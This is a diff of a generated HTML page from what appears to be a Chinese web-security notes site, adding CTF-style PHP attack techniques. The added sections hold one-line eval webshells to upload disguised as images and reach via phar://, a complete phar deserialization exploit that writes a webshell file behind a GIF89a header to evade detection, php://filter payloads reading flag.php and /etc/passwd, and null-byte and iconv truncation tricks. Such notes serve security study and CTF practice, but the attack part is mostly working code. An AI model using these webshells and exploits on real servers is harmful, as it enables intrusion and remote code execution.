@@ -396,8 +396,32 @@
   
   
     <li class="md-nav__item">
+      <a href="../../../Web%26Sec/php/" class="md-nav__link">
+        Php
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
       <a href="../../../Web%26Sec/waf%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/" class="md-nav__link">
         Waf绕过技巧
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Web%26Sec/%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/" class="md-nav__link">
+        上传绕过
       </a>
     </li>
   
@@ -2444,6 +2468,67 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#phar" class="md-nav__link">
+    phar
+  </a>
+  
+    <nav class="md-nav" aria-label="phar">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    一般利用
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    反序列化
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    截断
+  </a>
+  
+    <nav class="md-nav" aria-label="截断">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#00" class="md-nav__link">
+    00 截断
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#iconv" class="md-nav__link">
+    iconv函数字符编码导致截断
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    其他截断
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -3589,6 +3674,67 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#phar" class="md-nav__link">
+    phar
+  </a>
+  
+    <nav class="md-nav" aria-label="phar">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    一般利用
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    反序列化
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    截断
+  </a>
+  
+    <nav class="md-nav" aria-label="截断">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#00" class="md-nav__link">
+    00 截断
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#iconv" class="md-nav__link">
+    iconv函数字符编码导致截断
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    其他截断
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -3677,15 +3823,122 @@ php对post过来的文件有一个默认处理流程，即在一个处理周期�
 4./tmp目录下的上传文件得以保留
 5.包含/tmp目录下的上传文件形成webshell
 <img alt="disable functions" src="../php/2018-11-19-08-19-37.png" /></p>
-<hr />
-<p>作者：我好菜啊 
-来源：CSDN 
-原文：<a href="https://blog.csdn.net/qq_30123355/article/details/58165038">https://blog.csdn.net/qq_30123355/article/details/58165038</a> </p>
 <h2 id="php">php伪协议<a class="headerlink" href="#php" title="Permanent link">&para;</a></h2>
 <p><a href="https://lorexxar.cn/2016/09/14/php-wei/">https://lorexxar.cn/2016/09/14/php-wei/</a>
 读取../flag.php
 <div class="highlight"><pre><span></span><code>module=php://filter/read=convert.base64-encode/resource/../flag&amp;name=php
+include(‘php://filter/string.strip_tags/resource=/etc/passwd’)直接崩溃php，
 </code></pre></div></p>
+<h2 id="phar">phar<a class="headerlink" href="#phar" title="Permanent link">&para;</a></h2>
+<h3 id="_5">一般利用<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p>利用方法：
+将下面代码压缩成zip文件，然后将后缀改为png后上传。
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?</span><span class="o">=</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;1&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="x"></span>
+
+<span class="cp">&lt;?php</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;1&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="x"></span>
+
+<span class="x">&lt;script language=&#39;php&#39;&gt;</span>
+<span class="x">    eval($_POST[&#39;1&#39;]);</span>
+<span class="x">&lt;/script&gt;</span>
+</code></pre></div>
+之后用phar协议访问。
+<code>/?act=get&amp;pic=phar:///var/www/html/sandbox/5eac5f7bd6358e10ff53dec9f3bb8690/4a47a0db6e60853dedfcfdf08a5ca249.png/1.php</code></p>
+<h3 id="_6">反序列化<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<p><a href="https://blog.csdn.net/xiaorouji/article/details/83118619">https://blog.csdn.net/xiaorouji/article/details/83118619</a>
+<a href="https://cloud.tencent.com/developer/article/1350367">https://cloud.tencent.com/developer/article/1350367</a>
+exp：
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+
+ <span class="k">class</span> <span class="nc">PicManager</span><span class="p">{</span>
+     <span class="k">private</span> <span class="nv">$current_dir</span><span class="p">;</span>
+     <span class="k">private</span> <span class="nv">$whitelist</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;jpg&#39;</span><span class="p">,</span><span class="s1">&#39;png&#39;</span><span class="p">,</span><span class="s1">&#39;gif&#39;</span><span class="p">];</span>
+     <span class="k">private</span> <span class="nv">$logfile</span><span class="o">=</span><span class="s1">&#39;request.log&#39;</span><span class="p">;</span>
+     <span class="k">private</span> <span class="nv">$actions</span><span class="o">=</span><span class="p">[];</span>
+
+     <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$dir</span><span class="p">){</span>
+         <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">current_dir</span><span class="o">=</span><span class="nv">$dir</span><span class="p">;</span>
+         <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">))</span><span class="o">@</span><span class="nb">mkdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
+     <span class="p">}</span>
+
+     <span class="k">private</span> <span class="k">function</span> <span class="nf">_log</span><span class="p">(</span><span class="nv">$message</span><span class="p">){</span>
+         <span class="nb">array_push</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">actions</span><span class="p">,</span><span class="s1">&#39;[&#39;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s1">&#39;y-m-d h:i:s&#39;</span><span class="p">,</span><span class="nb">time</span><span class="p">())</span><span class="o">.</span><span class="s1">&#39;]&#39;</span><span class="o">.</span><span class="nv">$message</span><span class="p">);</span>
+     <span class="p">}</span>
+
+     <span class="k">public</span> <span class="k">function</span> <span class="nf">pics</span><span class="p">(){</span>
+         <span class="nb">log</span><span class="p">(</span><span class="s1">&#39;list pics&#39;</span><span class="p">);</span>
+         <span class="nv">$pics</span><span class="o">=</span><span class="p">[];</span>
+         <span class="k">foreach</span><span class="p">(</span><span class="nb">scandir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">){</span>
+             <span class="k">if</span><span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$item</span><span class="p">,</span><span class="o">-</span><span class="mi">4</span><span class="p">),</span><span class="nv">$whitelist</span><span class="p">))</span>
+                 <span class="nb">array_push</span><span class="p">(</span><span class="nv">$pics</span><span class="p">,</span><span class="nv">$current_dir</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$item</span><span class="p">);</span>
+         <span class="p">}</span>
+         <span class="k">return</span> <span class="nv">$pics</span><span class="p">;</span>
+     <span class="p">}</span>
+     <span class="k">public</span> <span class="k">function</span> <span class="nf">upload_pic</span><span class="p">(){</span>
+         <span class="nx">_log</span><span class="p">(</span><span class="s1">&#39;upload pic&#39;</span><span class="p">);</span>
+         <span class="nv">$file</span><span class="o">=</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
+         <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="o">-</span><span class="mi">4</span><span class="p">),</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">whitelist</span><span class="p">)){</span>
+             <span class="nx">_log</span><span class="p">(</span><span class="s1">&#39;unsafe deal:upload filename &#39;</span><span class="o">.</span><span class="nv">$file</span><span class="p">);</span>
+             <span class="k">return</span><span class="p">;</span>
+         <span class="p">}</span>
+         <span class="nv">$newname</span><span class="o">=</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span><span class="o">.</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="o">-</span><span class="mi">4</span><span class="p">);</span>
+         <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span><span class="nv">$current_dir</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$newname</span><span class="p">);</span>
+     <span class="p">}</span>
+     <span class="k">public</span> <span class="k">function</span> <span class="nf">get_pic</span><span class="p">(</span><span class="nv">$picname</span><span class="p">){</span>
+         <span class="nx">_log</span><span class="p">(</span><span class="s1">&#39;get pic&#39;</span><span class="o">.</span><span class="nv">$picname</span><span class="p">);</span>
+         <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$picname</span><span class="p">))</span>
+             <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+         <span class="k">else</span> <span class="k">return</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$picname</span><span class="p">);</span>
+     <span class="p">}</span>
+     <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
+         <span class="nv">$fp</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">current_dir</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logfile</span><span class="p">,</span><span class="s2">&quot;a+&quot;</span><span class="p">);</span>
+         <span class="k">foreach</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">actions</span> <span class="k">as</span> <span class="nv">$act</span><span class="p">){</span>
+             <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="nv">$act</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
+         <span class="p">}</span>
+         <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
+     <span class="p">}</span>
+
+     <span class="k">public</span> <span class="k">function</span> <span class="nf">gen</span><span class="p">(){</span>
+         <span class="o">@</span><span class="nb">rmdir</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">current_dir</span><span class="p">);</span>
+         <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">current_dir</span><span class="o">=</span><span class="s2">&quot;/var/www/html/sandbox/a6bfb20ba19df73fcceb438f5f75948f/&quot;</span><span class="p">;</span> <span class="c1">//md5($_SERVER[&#39;REMOTE_ADDR&#39;])</span>
+         <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logfile</span><span class="o">=</span><span class="s1">&#39;H4lo.php&#39;</span><span class="p">;</span>
+         <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">actions</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;&lt;?php eval($_REQUEST[p]);&#39;</span><span class="p">];</span>
+         <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="s1">&#39;phar.phar&#39;</span><span class="p">);</span>
+
+
+         <span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">&quot;phar.phar&quot;</span><span class="p">);</span>
+         <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
+         <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s2">&quot;GIF89a&quot;</span><span class="o">.</span><span class="s2">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span><span class="p">);</span> <span class="c1">//设置stub，增加gif文件头用以欺骗检测</span>
+         <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$this</span><span class="p">);</span> <span class="c1">//将自定义meta-data存入manifest</span>
+         <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">&quot;test.txt&quot;</span><span class="p">,</span> <span class="s2">&quot;test&quot;</span><span class="p">);</span> <span class="c1">//添加要压缩的文件</span>
+                 <span class="c1">//签名自动计算</span>
+         <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
+
+     <span class="p">}</span>
+ <span class="p">}</span>
+
+<span class="nv">$pic</span><span class="o">=</span><span class="k">new</span> <span class="nx">PicManager</span><span class="p">(</span><span class="s1">&#39;/var/www/html/sandbox&#39;</span><span class="p">);</span>
+<span class="nv">$pic</span><span class="o">-&gt;</span><span class="na">gen</span><span class="p">();</span>
+</code></pre></div></p>
+<h2 id="_7">截断<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h2>
+<h3 id="00">00 截断<a class="headerlink" href="#00" title="Permanent link">&para;</a></h3>
+<p>用于上传
+magic_quotes_gpc=Off
+php版本小于5.3.4
+00无效时，使用0x0~0xff中的acsii字符尝试。</p>
+<h3 id="iconv">iconv函数字符编码导致截断<a class="headerlink" href="#iconv" title="Permanent link">&para;</a></h3>
+<p>char(128)到(255)之间的字符转换为gbk编码时为空值。
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="nv">$a</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span><span class="o">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">130</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;2&#39;</span><span class="p">;</span>
+<span class="k">echo</span> <span class="nv">$a</span><span class="o">.</span><span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;</span>
+<span class="nx">echoh</span> <span class="nb">iconv</span><span class="p">(</span><span class="s1">&#39;UTF-8&#39;</span><span class="p">,</span><span class="s1">&#39;GBK&#39;</span><span class="p">,</span><span class="nv">$a</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div></p>
+<h3 id="_8">其他截断<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
+<ol>
+<li>url %3f后面会当参数</li>
+<li>sql注入中的注释，换行</li>
+<li>文件包含中，上传中长文件名，会对后缀名忽略。</li>
+</ol>
                 
               
               
